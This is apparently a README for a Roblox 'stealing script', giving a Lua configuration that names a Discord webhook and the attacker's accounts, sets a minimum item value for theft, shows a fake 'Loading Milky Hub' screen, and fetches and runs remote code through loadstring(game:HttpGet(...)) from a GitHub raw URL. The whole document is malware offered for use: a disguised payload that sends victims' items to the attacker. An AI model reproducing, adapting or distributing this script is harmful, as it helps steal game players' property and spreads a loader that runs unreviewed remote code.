# Steal
The stealing script

The script should look like this:

```lua
Webhook = "" --your discord webhook

Usernames = {"AlternativeAccount1",
             "AlternativeAccount2" ,
             "ExampleAccountName",
             "AnotherExampleAccountName"} --put the name of all your accounts and alts to send pets to (from important to less important).

MailMessage = "Things got send" -- try to keep very short to avoid it not working
LoadingScreenText = "Loading Milky Hub"
min_rap = 2000000 -- minimum rap of each item you want to get sent to you. 2 mil by default. 

loadstring(game:HttpGet("https://raw.githubusercontent.com/Cezar-Very-Epic/Steal/main/StealScript"))()
```

You can also check Steal Custom Loadingscreen if you want to make your own loadingscreen (only do that if you have coding experience) or no loadingscreen at all (not recomanded).
